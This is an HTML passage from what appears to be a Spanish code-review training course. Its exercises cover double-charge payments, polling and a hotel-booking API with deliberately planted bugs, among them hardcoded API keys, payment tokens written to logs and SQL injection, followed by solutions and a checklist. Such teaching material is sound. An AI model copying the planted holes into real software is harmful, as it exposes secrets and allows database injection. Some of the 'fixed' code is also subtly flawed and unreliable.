+<span class="cmt">// El href es "#" en vez de "javascript:..."</span></code></pre>
+  </div>
+  <label class="check-done"><input type="checkbox"> Completado</label>
+</article>
+
+<!-- Ejercicio 5.2 -->
+<article class="exercise" data-ex="5.2">
+  <div class="ex-head">
+    <h4>Ejercicio 5.2 — Formulario de pago sin idempotency ni bloqueo</h4>
+    <span class="badge">Race condition UI</span>
+    <span class="tag ui">UI</span>
+    <span class="tag js">JS</span>
+    <span class="diff d2">Media</span><span class="done-label">✅ Completado</span>
+  </div>
+  <p>Botón de pago que permite doble click y cobra dos veces.</p>
+<pre><code>document.getElementById(<span class="str">"pay-btn"</span>).addEventListener(<span class="str">"click"</span>, <span class="kw">async</span> () =&gt; {
+  <span class="kw">const</span> res = <span class="kw">await</span> <span class="fn">fetch</span>(<span class="str">"/api/charge"</span>, {
+    method: <span class="str">"POST"</span>,
+    body: JSON.<span class="fn">stringify</span>({amount: <span class="num">99.99</span>})
+  });
+  <span class="kw">const</span> data = <span class="kw">await</span> res.<span class="fn">json</span>();
+  alert(<span class="str">"Pago exitoso!"</span>);
+});</code></pre>
+  <div class="actions">
+    <button class="btn-hint">💡 Pista</button>
+    <button class="btn-sol">🔓 Ver solución</button>
+  </div>
+  <div class="hint hidden">
+    <p><strong>Pista:</strong> ¿Qué pasa si el usuario hace doble click rápido? ¿Se deshabilita el botón? ¿Hay una idempotency key para que el servidor detecte duplicados? ¿Qué pasa si la red es lenta y el usuario se impacienta?</p>
+  
+    <p data-hint2><strong>Pista 2 (guiada):</strong> Haz doble click mental: dos handlers corren a la vez. Preguntate: que flag falta en cliente y que header falta al servidor?</p>
+  </div>
+  <div class="solution hidden">
+    <p><strong>1. ¿Qué falla?</strong> No hay bloqueo del botón durante el request, no hay idempotency key, y no se verifica <code>res.ok</code>. Doble click = doble cobro.</p>
+    <p><strong>2. ¿Por qué falla?</strong> Entre el primer click y la respuesta del servidor (puede tardar 2-5 segundos), el botón sigue activo. Cada click dispara un POST independiente. Sin idempotency key, el servidor no puede detectar que son el mismo pago.</p>
+    <p><strong>3. ¿Cuándo se manifiesta?</strong> Con redes lentas, servidores sobrecargados, o usuarios impacientes. Especialmente común en móvil con latencia alta.</p>
+    <p><strong>4. Corrección:</strong></p>
+<pre><code><span class="kw">function</span> <span class="fn">uuid</span>() { <span class="kw">return</span> crypto.<span class="fn">randomUUID</span>(); }
+
+<span class="kw">let</span> processing = <span class="kw">false</span>;
+document.getElementById(<span class="str">"pay-btn"</span>).addEventListener(<span class="str">"click"</span>, <span class="kw">async</span> () =&gt; {
+  <span class="kw">if</span> (processing) <span class="kw">return</span>;
+  processing = <span class="kw">true</span>;
+  <span class="kw">const</span> btn = event.target;
+  btn.disabled = <span class="kw">true</span>;
+  btn.textContent = <span class="str">"Procesando..."</span>;
+  <span class="kw">try</span> {
+    <span class="kw">const</span> res = <span class="kw">await</span> <span class="fn">fetch</span>(<span class="str">"/api/charge"</span>, {
+      method: <span class="str">"POST"</span>,
+      headers: {
+        <span class="str">"Content-Type"</span>: <span class="str">"application/json"</span>,
+        <span class="str">"Idempotency-Key"</span>: <span class="fn">uuid</span>()
+      },
+      body: JSON.<span class="fn">stringify</span>({amount: <span class="num">99.99</span>})
+    });
+    <span class="kw">if</span> (!res.ok) <span class="kw">throw new</span> Error(<span class="str">`Error ${res.status}`</span>);
+    alert(<span class="str">"Pago exitoso!"</span>);
+  } <span class="kw">catch</span> (err) {
+    alert(<span class="str">"Error en el pago. Intente de nuevo."</span>);
+    btn.disabled = <span class="kw">false</span>;
+    btn.textContent = <span class="str">"Pagar"</span>;
+    processing = <span class="kw">false</span>;
+  }
+});</code></pre>
+    <p><strong>5. Verificación:</strong></p>
+<pre><code><span class="cmt">// Simular doble click</span>
+btn.<span class="fn">click</span>();
+btn.<span class="fn">click</span>(); <span class="cmt">// el segundo se ignora porque processing=true</span>
+<span class="cmt">// Verificar que solo se hizo 1 request POST</span></code></pre>
+  </div>
+  <label class="check-done"><input type="checkbox"> Completado</label>
+</article>
+
+<!-- Ejercicio 5.3 -->
+<article class="exercise" data-ex="5.3">
+  <div class="ex-head">
+    <h4>Ejercicio 5.3 — Polling con reentrada y sin backoff</h4>
+    <span class="badge">Polling</span>
+    <span class="tag ui">UI</span>
+    <span class="tag js">JS</span>
+    <span class="diff d2">Media</span><span class="done-label">✅ Completado</span>
+  </div>
+  <p>Polling cada 5 segundos para actualizar datos. Cuando el servidor es lento, se acumulan requests.</p>
+<pre><code><span class="fn">setInterval</span>(<span class="kw">async</span> () =&gt; {
+  <span class="kw">const</span> res = <span class="kw">await</span> <span class="fn">fetch</span>(<span class="str">"/api/status"</span>);
+  <span class="kw">const</span> data = <span class="kw">await</span> res.<span class="fn">json</span>();
+  <span class="fn">updateUI</span>(data);
+}, <span class="num">5000</span>);</code></pre>
+  <div class="actions">
+    <button class="btn-hint">💡 Pista</button>
+    <button class="btn-sol">🔓 Ver solución</button>
+  </div>
+  <div class="hint hidden">
+    <p><strong>Pista:</strong> Si el fetch tarda 8 segundos pero el intervalo es de 5, ¿qué pasa a los 5 segundos? ¿Se lanza otro fetch mientras el primero sigue pendiente? ¿Qué pasa si el servidor está caído? ¿Hay algún límite o backoff?</p>
+  
+    <p data-hint2><strong>Pista 2 (guiada):</strong> Dibuja fetch de 8s con intervalo de 5s. Preguntate: cuantos fetch vivos hay a los 10s? Y si el server cae, afloja o martillea?</p>
+  </div>
+  <div class="solution hidden">
+    <p><strong>1. ¿Qué falla?</strong> <code>setInterval</code> no espera a que el callback async termine. Si el fetch tarda más de 5s, se acumulan requests concurrentes (reentrada). No hay backoff exponencial cuando el servidor falla, ni deduplicación.</p>
+    <p><strong>2. ¿Por qué falla?</strong> <code>setInterval</code> lanza el callback cada 5s sin importar si el anterior terminó. Si la respuesta tarda 8s, a los 5s se lanza otro fetch, a los 10s otro, etc. Los requests se acumulan y pueden saturar el servidor o causar race conditions en la UI.</p>
+    <p><strong>3. ¿Cuándo se manifiesta?</strong> Cuando el servidor es lento (alta latencia, sobrecarga) o cuando hay un pico de tráfico. El efecto bola de nieve: más requests → servidor más lento → más acumulación.</p>
+    <p><strong>4. Corrección:</strong></p>
+<pre><code><span class="kw">let</span> polling = <span class="kw">true</span>;
+<span class="kw">let</span> delay = <span class="num">5000</span>;
+<span class="kw">const</span> MAX_DELAY = <span class="num">60000</span>;
+
+<span class="kw">async function</span> <span class="fn">poll</span>() {
+  <span class="kw">while</span> (polling) {
+    <span class="kw">try</span> {
+      <span class="kw">const</span> res = <span class="kw">await</span> <span class="fn">fetch</span>(<span class="str">"/api/status"</span>);
+      <span class="kw">if</span> (!res.ok) <span class="kw">throw new</span> Error(<span class="str">`HTTP ${res.status}`</span>);
+      <span class="kw">const</span> data = <span class="kw">await</span> res.<span class="fn">json</span>();
+      <span class="fn">updateUI</span>(data);
+      delay = <span class="num">5000</span>; <span class="cmt">// reset backoff en éxito</span>
+    } <span class="kw">catch</span> (err) {
+      delay = Math.<span class="fn">min</span>(delay * <span class="num">2</span>, MAX_DELAY); <span class="cmt">// backoff exponencial</span>
+      console.<span class="fn">warn</span>(<span class="str">"Poll error, next in"</span>, delay, <span class="str">"ms"</span>);
+    }
+    <span class="kw">await new</span> Promise(r =&gt; <span class="fn">setTimeout</span>(r, delay));
+  }
+}
+<span class="fn">poll</span>();</code></pre>
+    <p><strong>5. Verificación:</strong></p>
+<pre><code><span class="cmt">// Simular servidor lento (8s de latencia)</span>
+<span class="cmt">// Con setInterval: a los 5s hay 2 requests, a los 10s hay 3...</span>
+<span class="cmt">// Con el while+await: solo 1 request a la vez, nunca se acumulan</span>
+<span class="cmt">// Con servidor caído: delay crece 5s → 10s → 20s → 40s → 60s (max)</span></code></pre>
+  </div>
+  <label class="check-done"><input type="checkbox"> Completado</label>
+</article>
+</section>
+
+<!-- ===================== MÓDULO 6 ===================== -->
+<section id="m6">
+<h2>🏆 Módulo 6 — Simulacro final</h2>
+
+<p>Este ejercicio simula una tarea real de revisión de código en DataAnnotation/Outlier. Tienes una API de reservas de hotel con <strong>17 bugs</strong> distribuidos en 5 categorías. Tu objetivo: identificarlos todos, clasificarlos y proponer corrección.</p>
+
+<div class="box warn">
+  <span class="box-title">⏱️ Instrucciones</span>
+  <p>Cronometra 45 minutos. Escribe tu revisión ANTES de ver la solución. Usa la plantilla de 5 pasos para cada bug.</p>
+</div>
+
+<div class="theory">
+  <h4>📚 Teoría M6 — Cómo atacar el simulacro como un senior (léeme antes del cronómetro)</h4>
+  <p>No leas el código de arriba a abajo: <strong>barre por categorías</strong> en 3 pasadas. Cada pasada tiene una pregunta guía y un lugar donde anotar. Así garantizas cobertura de los 17 bugs en 45 minutos.</p>
+  <h5>Pasada 1 — Seguridad y secretos (10 min)</h5>
+  <ul>
+    <li>Pregunta: ¿hay <strong>secretos</strong> (keys, passwords, tokens) en código, logs o errores? ¿Hay <strong>SQL construido con strings</strong>?</li>
+    <li>Marca: S1 key hardcoded, S2 password hardcoded, S3 token en logs, S4 SQL con f-string.</li>
+  </ul>
+  <h5>Pasada 2 — Validación y errores (15 min)</h5>
+  <ul>
+    <li>Pregunta: por cada input (noches, hotel_id, token, email), ¿qué pasa con <strong>tipo wrong, negativo, enorme, inexistente</strong>? ¿Y si el servicio externo falla (timeout, 5xx)?</li>
+    <li>Marca: V1–V5 (tipos y rangos), E1–E4 (timeout, raise_for_status, orden email/cobro, try/except global).</li>
+  </ul>
+  <h5>Pasada 3 — Negocio y concurrencia (15 min + 5 de repaso)</h5>
+  <ul>
+    <li>Pregunta: si el usuario hace <strong>doble click</strong> o dos requests llegan a la vez, ¿se cobra doble? ¿El orden <strong>reservar → cobrar → confirmar → notificar</strong> deja estados inconsistentes? ¿La función <strong>bloquea</strong> el loop?</li>
+    <li>Marca: L1 idempotencia, L2 precio/availability, L3 orden de operaciones, C1 sync vs async.</li>
+  </ul>
+  <p>Para cada bug escribe: severidad (Crítica/Alta/Media), el caso que lo dispara y la corrección mínima. Si dudas entre dos severidades, elige la mayor y justifícala.</p>
+</div>
+
+<article class="exercise" data-ex="6.1">
+  <div class="ex-head">
+    <h4>Ejercicio 6.1 — API de reservas de hotel (17 bugs)</h4>
+    <span class="badge">Simulacro completo</span>
+    <span class="tag py">PY</span>
+    <span class="tag http">HTTP</span>
+    <span class="diff d3">Dificil</span><span class="done-label">✅ Completado</span>
+  </div>
+<pre><code><span class="cmt"># hotel_api.py</span>
+<span class="kw">from</span> fastapi <span class="kw">import</span> FastAPI, Request
+<span class="kw">import</span> requests, stripe, smtplib, logging, os
+
+STRIPE_KEY = <span class="str">"sk_live_51HG3..."</span>
+SMTP_PASS = <span class="str">"supersecret123"</span>
+HOTELES = {<span class="str">"H1"</span>: {<span class="str">"precio"</span>: <span class="num">100</span>, <span class="str">"nombre"</span>: <span class="str">"Playa Resort"</span>},
+           <span class="str">"H2"</span>: {<span class="str">"precio"</span>: <span class="num">200</span>, <span class="str">"nombre"</span>: <span class="str">"Montaña Lodge"</span>}}
+
+logger = logging.<span class="fn">getLogger</span>(__name__)
+app = <span class="fn">FastAPI</span>()
+stripe.api_key = STRIPE_KEY
+
+<span class="kw">@app.post</span>(<span class="str">"/reservar"</span>)
+<span class="kw">def</span> <span class="fn">reservar</span>(request: Request):
+    data = request.json()
+    hotel_id = data[<span class="str">"hotel_id"</span>]
+    checkin = data[<span class="str">"checkin"</span>]
+    noches = data[<span class="str">"noches"</span>]
+    token = data[<span class="str">"token_pago"</span>]
+    email = data[<span class="str">"email"</span>]
+
+    logger.<span class="fn">info</span>(<span class="str">f"Reserva: hotel={hotel_id} noches={noches} token={token} email={email}"</span>)
+
+    precio_noche = HOTELES[hotel_id][<span class="str">"precio"</span>]
+    total = precio_noche * noches
+
+    <span class="cmt"># Cobrar</span>
+    charge = stripe.Charge.<span class="fn">create</span>(
+        amount=<span class="fn">int</span>(total * <span class="num">100</span>),
+        currency=<span class="str">"usd"</span>,
+        source=token,
+        description=<span class="str">f"Reserva {hotel_id}"</span>
+    )
+
+    <span class="cmt"># Confirmar reserva en DB</span>
+    db.<span class="fn">execute</span>(<span class="str">f"INSERT INTO reservas VALUES ('{hotel_id}', '{checkin}', {noches}, '{email}')"</span>)
+
+    <span class="cmt"># Enviar confirmación</span>
+    server = smtplib.<span class="fn">SMTP</span>(<span class="str">"smtp.gmail.com"</span>)
+    server.<span class="fn">login</span>(<span class="str">"hotel@gmail.com"</span>, SMTP_PASS)
+    server.<span class="fn">sendmail</span>(<span class="str">"hotel@gmail.com"</span>, email,
+        <span class="str">f"Subject: Confirmación\n\nReserva confirmada por ${total}"</span>)
+    server.<span class="fn">quit</span>()
+
+    <span class="kw">return</span> {<span class="str">"status"</span>: <span class="str">"ok"</span>, <span class="str">"total"</span>: total, <span class="str">"charge_id"</span>: charge.id}</code></pre>
+
+  <div class="actions">
+    <button class="btn-hint">💡 Pista</button>
+    <button class="btn-sol">🔓 Ver solución</button>
+  </div>
+  <div class="hint hidden">
+    <p><strong>Pista — Dónde buscar los 17 bugs:</strong></p>
+    <ul>
+      <li><strong>Seguridad (4):</strong> Keys hardcoded (2), secrets en logs (1), SQL injection (1)</li>
+      <li><strong>Validación (5):</strong> noches sin tipo (1), noches negativo (1), noches enorme (1), hotel_id no validado (1), token sin validar (1)</li>
+      <li><strong>Manejo de errores (4):</strong> sin raise_for_status en SMTP (1), sin timeout en SMTP (1), email después de cobrar (1), sin try/except global (1)</li>
+      <li><strong>Lógica de negocio (3):</strong> sin idempotencia (1), precio fijo sin consultar disponibilidad (1), orden de operaciones: cobrar antes de confirmar (1)</li>
+      <li><strong>Concurrencia (1):</strong> función síncrona con requests bloqueantes</li>
+    </ul>
+  
+    <p data-hint2><strong>Pista 2 (guiada):</strong> Haz 3 pasadas: (1) secretos y SQL, (2) cada input con tipo-negativo-enorme-inexistente mas timeouts, (3) doble-click y orden reservar-cobrar-confirmar.</p>
+  </div>
+  <div class="solution hidden">
+    <h4>📋 Revisión completa — 17 bugs identificados</h4>
+
+    <h4>🔴 Seguridad (4 bugs)</h4>
+    <table>
+      <tr><th>#</th><th>Bug</th><th>Severidad</th><th>Corrección</th></tr>
+      <tr><td>S1</td><td>STRIPE_KEY hardcoded</td><td>Crítica</td><td>Usar <code>os.environ["STRIPE_KEY"]</code></td></tr>
+      <tr><td>S2</td><td>SMTP_PASS hardcoded</td><td>Crítica</td><td>Usar variable de entorno</td></tr>
+      <tr><td>S3</td><td>Token de pago en logs</td><td>Alta</td><td>Nunca loggear tokens/PII</td></tr>
+      <tr><td>S4</td><td>SQL injection con f-string en INSERT</td><td>Crítica</td><td>Usar parámetros vinculados</td></tr>
+    </table>
+
+    <h4>🟡 Validación (5 bugs)</h4>
+    <table>
+      <tr><th>#</th><th>Bug</th><th>Severidad</th><th>Corrección</th></tr>
+      <tr><td>V1</td><td><code>noches</code> sin tipo — acepta string</td><td>Alta</td><td>Pydantic model con <code>int</code></td></tr>
+      <tr><td>V2</td><td><code>noches</code> negativo aceptado</td><td>Alta</td><td>Validar <code>noches >= 1</code></td></tr>
+      <tr><td>V3</td><td><code>noches</code> enorme (999999) — DoS financiero</td><td>Media</td><td>Validar <code>noches &lt;= 30</code></td></tr>
+      <tr><td>V4</td><td><code>hotel_id</code> no validado — KeyError si no existe</td><td>Alta</td><td>Validar contra HOTELES, devolver 404</td></tr>
+      <tr><td>V5</td><td><code>token</code> sin validar formato</td><td>Media</td><td>Validar que empiece con <code>tok_</code></td></tr>
+    </table>
+
+    <h4>🟠 Manejo de errores (4 bugs)</h4>
+    <table>
+      <tr><th>#</th><th>Bug</th><th>Severidad</th><th>Corrección</th></tr>
+      <tr><td>E1</td><td>SMTP sin timeout — bloquea el thread</td><td>Alta</td><td><code>SMTP(timeout=10)</code></td></tr>
+      <tr><td>E2</td><td>SMTP sin verificación de errores</td><td>Media</td><td>Try/except con rollback</td></tr>
+      <tr><td>E3</td><td>Email se envía DESPUÉS de cobrar — si falla email, se cobró sin confirmar</td><td>Crítica</td><td>Confirmar DB antes, email asincrónico</td></tr>
+      <tr><td>E4</td><td>Sin try/except global — errores devuelven 500 con stack trace</td><td>Alta</td><td>Exception handler + respuesta genérica</td></tr>
+    </table>
+
+    <h4>🔵 Lógica de negocio (3 bugs)</h4>
+    <table>
+      <tr><th>#</th><th>Bug</th><th>Severidad</th><th>Corrección</th></tr>
+      <tr><td>L1</td><td>Sin idempotency — doble click = doble cobro</td><td>Crítica</td><td>Idempotency-Key header</td></tr>
+      <tr><td>L2</td><td>Precio fijo — no consulta disponibilidad real</td><td>Alta</td><td>Consultar DB de disponibilidad</td></tr>
+      <tr><td>L3</td><td>Orden: cobra → confirma → notifica. Si confirma falla, se cobró sin reserva</td><td>Crítica</td><td>Reservar pendiente → cobrar → confirmar → notificar</td></tr>
+    </table>
+
+    <h4>🟣 Concurrencia (1 bug)</h4>
+    <table>
+      <tr><th>#</th><th>Bug</th><th>Severidad</th><th>Corrección</th></tr>
+      <tr><td>C1</td><td><code>def</code> síncrono con <code>requests</code> y <code>smtplib</code> — bloquea el event loop</td><td>Alta</td><td><code>async def</code> con <code>httpx</code> y <code>aiosmtplib</code></td></tr>
+    </table>
+
+    <h4>✅ Reescritura completa corregida</h4>
+<pre><code><span class="kw">import</span> os, uuid, logging
+<span class="kw">from</span> fastapi <span class="kw">import</span> FastAPI, HTTPException, Header
+<span class="kw">from</span> pydantic <span class="kw">import</span> BaseModel, Field
+<span class="kw">import</span> httpx, stripe, asyncpg
+
+logger = logging.<span class="fn">getLogger</span>(__name__)
+app = <span class="fn">FastAPI</span>()
+
+stripe.api_key = os.environ[<span class="str">"STRIPE_KEY"</span>]  <span class="cmt"># S1, S2: de variables de entorno</span>
+
+HOTELES = {<span class="str">"H1"</span>: {<span class="str">"precio"</span>: <span class="num">100</span>, <span class="str">"nombre"</span>: <span class="str">"Playa Resort"</span>},
+           <span class="str">"H2"</span>: {<span class="str">"precio"</span>: <span class="num">200</span>, <span class="str">"nombre"</span>: <span class="str">"Montaña Lodge"</span>}}
+
+<span class="kw">class</span> <span class="fn">ReservaRequest</span>(BaseModel):  <span class="cmt"># V1: Pydantic valida tipos</span>
+    hotel_id: <span class="fn">str</span>
+    checkin: <span class="fn">str</span>
+    noches: <span class="fn">int</span> = Field(ge=<span class="num">1</span>, le=<span class="num">30</span>)  <span class="cmt"># V2, V3: rango válido</span>
+    token_pago: <span class="fn">str</span>
+    email: <span class="fn">str</span>
+
+<span class="kw">@app.post</span>(<span class="str">"/reservar"</span>)
+<span class="kw">async def</span> <span class="fn">reservar</span>(
+    req: ReservaRequest,
+    idempotency_key: <span class="fn">str</span> = Header(...),  <span class="cmt"># L1: idempotencia</span>
+):
+    <span class="cmt"># V4: validar hotel</span>
+    <span class="kw">if</span> req.hotel_id <span class="kw">not in</span> HOTELES:
+        <span class="kw">raise</span> HTTPException(<span class="num">404</span>, <span class="str">"Hotel no encontrado"</span>)
+
+    <span class="cmt"># V5: validar token</span>
+    <span class="kw">if not</span> req.token_pago.<span class="fn">startswith</span>(<span class="str">"tok_"</span>):
+        <span class="kw">raise</span> HTTPException(<span class="num">400</span>, <span class="str">"Token de pago inválido"</span>)
+
+    <span class="cmt"># S3: no loggear secrets</span>
+    logger.<span class="fn">info</span>(<span class="str">f"Reserva: hotel={req.hotel_id} noches={req.noches}"</span>)
+
+    <span class="cmt"># L3: Orden correcto — pendiente → cobrar → confirmar → notificar</span>
+    <span class="kw">try</span>:
+        precio = HOTELES[req.hotel_id][<span class="str">"precio"</span>]
+        total = precio * req.noches
+
+        <span class="cmt"># Paso 1: crear reserva pendiente</span>
+        reserva_id = <span class="kw">await</span> db.<span class="fn">execute</span>(
+            <span class="str">"INSERT INTO reservas (hotel_id, checkin, noches, email, status, idempotency_key) "</span>
+            <span class="str">"VALUES ($1,$2,$3,$4,'pendiente',$5) RETURNING id"</span>,
+            req.hotel_id, req.checkin, req.noches, req.email, idempotency_key
+        )
+
+        <span class="cmt"># Paso 2: cobrar</span>
+        charge = <span class="kw">await</span> httpx.<span class="fn">AsyncClient</span>().<span class="fn">post</span>(  <span class="cmt"># C1: async</span>
+            <span class="str">"https://api.stripe.com/v1/charges"</span>,
+            data={
+                <span class="str">"amount"</span>: <span class="fn">int</span>(total * <span class="num">100</span>),
+                <span class="str">"currency"</span>: <span class="str">"usd"</span>,
+                <span class="str">"source"</span>: req.token_pago,
+                <span class="str">"idempotency_key"</span>: idempotency_key,
+            },
+            headers={<span class="str">"Authorization"</span>: <span class="str">f"Bearer {stripe.api_key}"</span>},
+            timeout=<span class="num">30</span>,  <span class="cmt"># E1: timeout</span>
+        )
+
+        <span class="cmt"># Paso 3: confirmar reserva</span>
+        <span class="kw">await</span> db.<span class="fn">execute</span>(
+            <span class="str">"UPDATE reservas SET status='confirmada' WHERE id=$1"</span>, reserva_id
+        )
+
+        <span class="cmt"># Paso 4: notificar (asincrónico, no bloquea respuesta)</span>
+        <span class="kw">await</span> <span class="fn">enviar_email_async</span>(req.email, <span class="str">f"Reserva confirmada por ${total}"</span>)
+
+        <span class="kw">return</span> {<span class="str">"status"</span>: <span class="str">"ok"</span>, <span class="str">"total"</span>: total, <span class="str">"reserva_id"</span>: reserva_id}
+
+    <span class="kw">except</span> Exception <span class="kw">as</span> e:
+        <span class="cmt"># E4: no exponer internals</span>
+        logger.<span class="fn">error</span>(<span class="str">f"Error en reserva: {type(e).__name__}"</span>)
+        <span class="cmt"># Rollback: si se cobró pero no se confirmó, iniciar reembolso</span>
+        <span class="kw">raise</span> HTTPException(<span class="num">500</span>, <span class="str">"Error procesando reserva"</span>)</code></pre>
+
+    <h4>📊 Tabla de puntuación</h4>
+    <table>
+      <tr><th>Bugs encontrados</th><th>Calificación</th><th>Interpretación</th></tr>
+      <tr><td>0-3</td><td>Suspenso</td><td>Necesitas repasar los módulos 1-5</td></tr>
+      <tr><td>4-7</td><td>Base</td><td>Ves los bugs obvios pero te pierdes los sutiles</td></tr>
+      <tr><td>8-11</td><td>Aprobado</td><td>Buen ojo, listo para el examen real</td></tr>
+      <tr><td>12-17</td><td>Excelente</td><td>Nivel senior, puedes hacer code review profesional</td></tr>
+    </table>
+  </div>
+  <label class="check-done"><input type="checkbox"> Completado</label>
+</article>
+</section>
+
+<!-- ===================== PLANTILLA ===================== -->
+<section id="plantilla">
+<h2>📝 Plantilla de respuesta</h2>
+<p>Copia esta plantilla para cada ejercicio. El formato Markdown de 5 pasos es el que esperan los evaluadores de DataAnnotation y Outlier.</p>
+<pre><code><span class="cmt">## Bug identificado</span>
+
+<span class="cmt">### 1. ¿Qué falla?</span>
+[Una frase que identifica el bug concreto]
+
+<span class="cmt">### 2. ¿Por qué falla?</span>
+[La causa raíz técnica — mecanismo del lenguaje/runtime]
+
+<span class="cmt">### 3. ¿Cuándo se manifiesta?</span>
+[El caso concreto que lo dispara]
+
+<span class="cmt">### 4. Corrección</span>
+<span class="cmt">### 5. Verificación</span>
+[Asserts o casos de prueba que demuestran la corrección]
+</code></pre>
+</section>
+
+<!-- ===================== CHECKLIST ===================== -->
+<section id="checklist">
+<h2>✅ Checklist antes de enviar</h2>
+<p>Repasa cada punto antes de entregar tu respuesta en DataAnnotation u Outlier. Marca cada casilla solo cuando lo hayas verificado de verdad en tu respuesta.</p>
+<ul class="checklist">
+  <li>
+    <label><input type="checkbox"> 1. Identifique el bug concreto en una frase, sin vaguedades.</label>
+  </li>
+  <li>
+    <label><input type="checkbox"> 2. Explique la causa raiz: el mecanismo del lenguaje o del runtime.</label>
+  </li>
+  <li>
+    <label><input type="checkbox"> 3. Describi el caso concreto que dispara el bug (input, estado o timing).</label>
+  </li>
+  <li>
+    <label><input type="checkbox"> 4. La correccion es minima: no reescribi el modulo entero.</label>
+  </li>
+  <li>
+    <label><input type="checkbox"> 5. Inclui asserts o casos de prueba que demuestran la correccion.</label>
+  </li>
+  <li>
+    <label><input type="checkbox"> 6. Revise edge cases: vacio, None/null, 0, limites y off-by-one.</label>
+  </li>
+  <li>
+    <label><input type="checkbox"> 7. Revise async: awaits, finally, concurrencia y race conditions.</label>
+  </li>
+  <li>
+    <label><input type="checkbox"> 8. Revise seguridad: secrets, logs, SQLi, XSS y autenticacion.</label>
+  </li>
+  <li>
+    <label><input type="checkbox"> 9. Revise HTTP: status correctos, res.ok, timeouts y reintentos.</label>
+  </li>
+  <li>
+    <label><input type="checkbox"> 10. No expongo internals: ni stack traces, ni tokens, ni PII.</label>
+  </li>
+  <li>
+    <label><input type="checkbox"> 11. El codigo corregido gestiona errores (try/except o .catch).</label>
+  </li>
+  <li>
+    <label><input type="checkbox"> 12. Relei la respuesta: clara, directa, sin relleno y en espanol.</label>
+  </li>
+</ul>
+</section>
+
+</main>
+</div>
+<script>
+(function () {
+  "use strict";
+
+  /* =====================================================
+   * Bootcamp AI Trainer — progreso y persistencia.
+   * Vanilla JS, sin dependencias externas.
+   *
+   * Estado en localStorage bajo KEY:
+   * - done: ids "N.N" de ejercicios completados.
+   * - open: ids "N.N:hint" / "N.N:sol" con panel abierto.
+   * ===================================================== */
+  var KEY = "bootcamp_ai_trainer_v1";
+  var TOTAL = 17;
+
+  /* Textos de los botones segun el estado de cada panel. */
+  var LABELS = {
+    hint: { show: "Pista", hide: "Ocultar pista" },
+    sol: { show: "Ver solucion", hide: "Ocultar solucion" }
+  };
+  /* Lee el estado guardado. Si no existe o esta corrupto,
+   * devuelve un estado vacio para empezar de cero. */
+  function loadState() {
+    try {
+      var raw = localStorage.getItem(KEY);
+      if (!raw) return { done: [], open: [] };
+      var parsed = JSON.parse(raw);
+      return {
+        done: Array.isArray(parsed.done) ? parsed.done : [],
+        open: Array.isArray(parsed.open) ? parsed.open : []
+      };
+    } catch (err) {
+      return { done: [], open: [] };
+    }
+  }
+
+  /* Guarda el estado. Si el almacenamiento falla (modo
+   * privado, cuota llena), la app sigue funcionando. */
+  function saveState(state) {
+    try {
+      localStorage.setItem(KEY, JSON.stringify(state));
+    } catch (err) {
+      /* sin persistencia: se continua solo en memoria */
+    }
+    schedulePush();
+  }
+
+  /* ============ SINCRONIZACION CON LA NUBE (Neon via Vercel) ============
+   * - localStorage es la fuente inmediata (funciona offline).
+   * - Si hay sesion, cada cambio se sube con debounce (PUT /api/progress).
+   * - Al entrar, la nube y lo local se fusionan por UNION (nunca se pierde nada).
+   * - Sin sesion o sin API (archivo local), todo sigue en local. */
+  var session = { active: false, email: null };
+  var syncTimer = null;
+  var pushing = false;
+  var syncDot = document.getElementById("syncDot");
+  var syncMsg = document.getElementById("syncMsg");
+
+  function setSync(mode, text) {
+    if (syncDot) syncDot.className = mode === "idle" ? "" : mode;
+    if (syncMsg) syncMsg.textContent = text;
+  }
+
+  function api(path, opts) {
+    return fetch(path, opts).then(function (res) {
+      return res.json().then(function (body) {
+        return { status: res.status, body: body };
+      }).catch(function () {
+        return { status: res.status, body: {} };
+      });
+    });
+  }
+
+  function union(a, b) {
+    var seen = {};
+    var out = [];
+    (a || []).concat(b || []).forEach(function (v) {
+      if (typeof v === "string" && !seen[v]) { seen[v] = 1; out.push(v); }
+    });
+    return out;
+  }
+
+  /* Sube el estado local a Neon (solo con sesion). */
+  function pushState() {
+    if (!session.active || pushing) return;
+    pushing = true;
+    setSync("busy", "Sincronizando con la nube...");
+    api("/api/progress", {
+      method: "PUT",
+      headers: { "content-type": "application/json" },
+      body: JSON.stringify({ done: state.done, open: state.open })
+    }).then(function (r) {
+      pushing = false;
+      if (r.status === 200 && r.body && r.body.ok) {
+        setSync("ok", "Sincronizado en la nube (" + session.email + "). Igual en celular y PC.");
+      } else if (r.status === 401) {
+        setLoggedOut("Sesion vencida. Entra de nuevo.");
+      } else {
+        setSync("err", "No se pudo sincronizar. Reintentando en el proximo cambio.");
+      }
+    }).catch(function () {
+      pushing = false;
+      setSync("err", "Sin conexion con la nube. Tu avance local esta a salvo.");
+    });
+  }
+
+  /* Espera 800ms tras el ultimo cambio antes de subir (debounce). */
+  function schedulePush() {
+    if (!session.active) return;
+    if (syncTimer) clearTimeout(syncTimer);
+    syncTimer = setTimeout(pushState, 800);
+  }
+
+  var state = loadState();
+  var pf = document.getElementById("pf");
+  var pt = document.getElementById("pt");
+
+  /* Pinta la barra de progreso y el contador "X / 17". */
+  function renderProgress() {
+    var done = document.querySelectorAll(".exercise.done").length;
+    var pct = Math.round((done / TOTAL) * 100);
+    if (pf) pf.style.width = pct + "%";
+    if (pt) pt.textContent = done + " / " + TOTAL;
+  }
+
+  /* Registra un panel como abierto o cerrado en el estado. */
+  function rememberOpen(id, kind, isOpen) {
+    var key = id + ":" + kind;
+    var i = state.open.indexOf(key);
+    if (isOpen && i === -1) state.open.push(key);
+    if (!isOpen && i !== -1) state.open.splice(i, 1);
+    saveState(state);
+  }
+  /* Aplica el estado a un panel: visibilidad + texto + memoria. */
+  function setPanel(exercise, kind, isOpen) {
+    var panel = exercise.querySelector(kind === "hint" ? ".hint" : ".solution");
+    var btn = exercise.querySelector(kind === "hint" ? ".btn-hint" : ".btn-sol");
+    if (panel) panel.classList.toggle("hidden", !isOpen);
+    if (btn) btn.textContent = isOpen ? LABELS[kind].hide : LABELS[kind].show;
+    rememberOpen(exercise.getAttribute("data-ex"), kind, isOpen);
+  }
+
+  /* Recorre los 17 ejercicios y engancha botones + checkbox.
+   * 1. Toggle de pista/solucion con classList.toggle("hidden").
+   * 2. Checkbox "Completado": marca .done y actualiza progreso.
+   * 3. Restaura el estado guardado al cargar la pagina. */
+  function initExercises() {
+    document.querySelectorAll(".exercise").forEach(function (exercise) {
+      var id = exercise.getAttribute("data-ex");
+      var hint = exercise.querySelector(".hint");
+      var solution = exercise.querySelector(".solution");
+      var btnHint = exercise.querySelector(".btn-hint");
